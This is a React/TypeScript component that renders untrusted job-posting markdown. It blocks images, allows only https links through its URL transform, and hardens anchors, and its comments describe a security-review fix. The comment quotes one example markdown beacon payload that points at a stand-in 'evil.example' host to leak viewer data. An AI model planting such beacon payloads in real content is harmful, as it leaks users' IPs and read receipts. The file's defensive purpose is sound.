import ReactMarkdown, { type Components } from 'react-markdown'
import { cn } from '@/lib/utils'
import { isSafeExternalUrl } from './open-original'

/**
 * UNTRUSTED third-party job-posting markdown, rendered inert. Extracted from
 * `JobSuggestionDialog` (r5 Task 7.3) so the vacancy-queue card renders it through the SAME
 * hardening; both call sites are pinned by tests (`PostingMarkdown.test.tsx`,
 * `JobSuggestionDialog.test.tsx`).
 *
 * RENDER-SIDE HARDENING — security-review round 2, HIGH-1.
 *
 * The previous claim of "two independent layers" was wrong. The ingest layer
 * (html-to-markdown.ts) MANUFACTURED the injection by interpolating the link
 * destination raw, and the "we don't enable rehype-raw" argument does not
 * apply at all to the payload that resulted:
 *
 *   [t](https://ok.example/x)![](https://evil.example/px.png?leak=1)
 *
 * — that is valid MARKDOWN, not raw HTML. The only thing that stood between it
 * and a beacon request to a foreign host was react-markdown's own default
 * `urlTransform`: a library internal we neither configured nor documented, and
 * therefore never actually chose.
 *
 * These three props are OUR second layer, independent of the API by
 * construction — they hold even if the markdown arrives fully attacker-
 * controlled (pinned by a test that feeds exactly that):
 *
 *   1. `urlTransform` — ours, https-only, same predicate as the one guarding
 *      `window.open`. Not the library default: react-markdown's default only
 *      blocks dangerous SCHEMES (`javascript:`, `data:`) and happily passes
 *      plain `http:` and any foreign host. This prop is the SOLE URL gate, and
 *      it covers every url-bearing node, including ones we have not overridden.
 *      Pinned by "pins urlTransform …" — a test that reddens when THIS prop is
 *      removed and stays green when the `a` component is.
 *   2. `disallowedElements={['img']}` — a third-party job ad NEVER renders a remote image in
 *      our authenticated origin. This kills the beacon class outright (read
 *      receipt + viewer IP), regardless of how the markdown was produced.
 *      `img-src` in our CSP is a blanket `https:` (noted in #470), so the
 *      browser would not have stopped it either.
 *   3. `a` — link hygiene: `rel="noopener noreferrer nofollow"` + new tab, and
 *      an EMPTY href (what layer 1 leaves behind when it rejects a URL)
 *      degrades to plain text instead of a dead anchor. Deliberately does NOT
 *      re-run the URL predicate — see the comment on the component itself.
 *      Pinned by "pins the `a` component …", which reddens on ITS removal and
 *      not on layer 1's.
 *
 * NO rehype-raw: raw HTML stays TEXT. Necessary, nowhere near sufficient — a
 * markdown-level payload is not raw HTML at all.
 */
/**
 * The string checked and the string returned are ONE variable, the trimmed one —
 * the same SR-M-2 discipline as `openOriginalPosting`, for the same reason:
 * `isSafeExternalUrl` validates `url.trim()`, so returning the raw `url` would put
 * a string nobody validated into an `href`. Leading U+00A0 / U+FEFF / U+2028
 * passed the check and then resolved against the CRM origin in the anchor.
 */
export const MARKDOWN_URL_TRANSFORM = (url: string): string => {
  const target = url.trim()
  return isSafeExternalUrl(target) ? target : ''
}

/** Layer 2: no `<img>` node at all, so nothing can request a remote image. */
const NO_IMAGES = ['img']

const MARKDOWN_COMPONENTS: Components = {
  // Link HYGIENE only — the URL was already gated by MARKDOWN_URL_TRANSFORM,
  // which blanks anything that is not https. Re-running the same predicate here
  // would make the two props indistinguishable: removing either would leave the
  // other covering for it, and NEITHER could then be pinned by a test. (That is
  // exactly how `urlTransform` shipped unverified in round 2.) An empty href —
  // what the transform produces for a rejected URL — degrades to plain text.
  a: ({ href, children }) =>
    href ? (
      <a href={href} target="_blank" rel="noopener noreferrer nofollow">
        {children}
      </a>
    ) : (
      <>{children}</>
    ),
}

export function PostingMarkdown({
  markdown,
  testId,
  className,
}: {
  markdown: string
  testId: string
  className?: string
}) {
  return (
    <div
      className={cn(
        'prose prose-sm dark:prose-invert max-w-none break-words text-sm leading-relaxed [&_a]:underline [&_li]:my-0.5 [&_p]:my-2 [&_ul]:list-disc [&_ul]:pl-5',
        className,
      )}
      data-testid={testId}
    >
      <ReactMarkdown
        urlTransform={MARKDOWN_URL_TRANSFORM}
        components={MARKDOWN_COMPONENTS}
        disallowedElements={NO_IMAGES}
      >
        {markdown}
      </ReactMarkdown>
    </div>
  )
}
